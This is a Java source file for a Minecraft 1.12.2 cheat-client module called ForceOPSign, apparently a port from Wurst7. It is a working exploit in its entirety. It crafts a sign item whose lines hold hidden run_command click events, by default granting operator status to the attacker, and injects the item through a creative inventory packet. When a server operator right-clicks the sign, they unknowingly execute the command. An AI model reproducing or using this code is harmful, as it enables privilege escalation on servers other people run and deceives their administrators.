/*
 * Wurst0 - a 1.12.2 port of Wurst7-CevAPI
 * Ported from Wurst7-CevAPI ForceOPSignHack (GPL-3.0-or-later)
 * Adapted to 1.12.2: the creative block-entity-data component API does
 * not exist, so the sign is built as a sign item whose BlockEntityTag
 * holds Text1-Text4 (JSON text with a run_command clickEvent on every
 * configured line) and swapped into the hotbar with a
 * CPacketCreativeInventoryAction. The original's "Clone sign mode"
 * checkbox was dead code (never read by the original) and was dropped.
 * Classic exploit: 1.12.2 TileEntitySign.executeCommand runs the
 * clicked line's command server-side when an OP right-clicks the sign;
 * most later servers patched sign command clicks.
 */
package net.wurst0.hacks;

import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.util.text.TextComponentString;
import net.wurst0.Category;
import net.wurst0.feature.Hack;
import net.wurst0.settings.TextFieldSetting;

public final class ForceOPSignHack extends Hack
{
        private final Minecraft mc = Minecraft.getMinecraft();

        private final TextFieldSetting command1 =
                new TextFieldSetting("Click command 1", "op {player}");
        private final TextFieldSetting command2 =
                new TextFieldSetting("Click command 2", "");
        private final TextFieldSetting command3 =
                new TextFieldSetting("Click command 3", "");
        private final TextFieldSetting command4 =
                new TextFieldSetting("Click command 4", "");

        public ForceOPSignHack()
        {
                super("ForceOPSign",
                        "Puts a creative sign in your hotbar whose lines run"
                                + " commands when an OP right-clicks it"
                                + " ({player} is replaced with your name)."
                                + " Needs creative mode.");
                setCategory(Category.CREATIVE_OP);
                addSettings(command1, command2, command3, command4);
        }

        @Override
        protected void onEnable()
        {
                EntityPlayerSP p = mc.player;
                if(p == null)
                {
                        setEnabled(false);
                        return;
                }
                if(!p.capabilities.isCreativeMode)
                {
                        p.sendMessage(new TextComponentString(
                                "\u00a7c[ForceOPSign]\u00a7r Creative mode"
                                        + " required."));
                        setEnabled(false);
                        return;
                }

                String self = p.getGameProfile().getName();
                String[] commands = {command1.getValue(), command2.getValue(),
                        command3.getValue(), command4.getValue()};

                NBTTagCompound blockEntityTag = new NBTTagCompound();
                blockEntityTag.setString("id", "minecraft:sign");
                for(int i = 0; i < 4; i++)
                {
                        String command =
                                commands[i] == null ? "" : commands[i].trim();
                        command = command.replace("{player}", self);
                        while(command.startsWith("/"))
                                command = command.substring(1);
                        String line;
                        if(command.isEmpty())
                                line = "{\"text\":\"\"}";
                        else
                                line = "{\"text\":\"\","
                                        + "\"clickEvent\":{\"action\":"
                                        + "\"run_command\",\"value\":\"/"
                                        + jsonEscape(command) + "\"}}";
                        blockEntityTag.setString("Text" + (i + 1), line);
                }

                NBTTagCompound tag = new NBTTagCompound();
                tag.setTag("BlockEntityTag", blockEntityTag);

                ItemStack stack = new ItemStack(Items.SIGN);
                stack.setTagCompound(tag);

                int slot = 36 + p.inventory.currentItem;
                p.connection.sendPacket(
                        new CPacketCreativeInventoryAction(slot, stack));
                p.sendMessage(new TextComponentString(
                        "\u00a7a[ForceOPSign]\u00a7r Sign created in your"
                                + " selected hotbar slot."));
                setEnabled(false);
        }

        private static String jsonEscape(String s)
        {
                if(s == null)
                        return "";
                return s.replace("\\", "\\\\").replace("\"", "\\\"");
        }
}
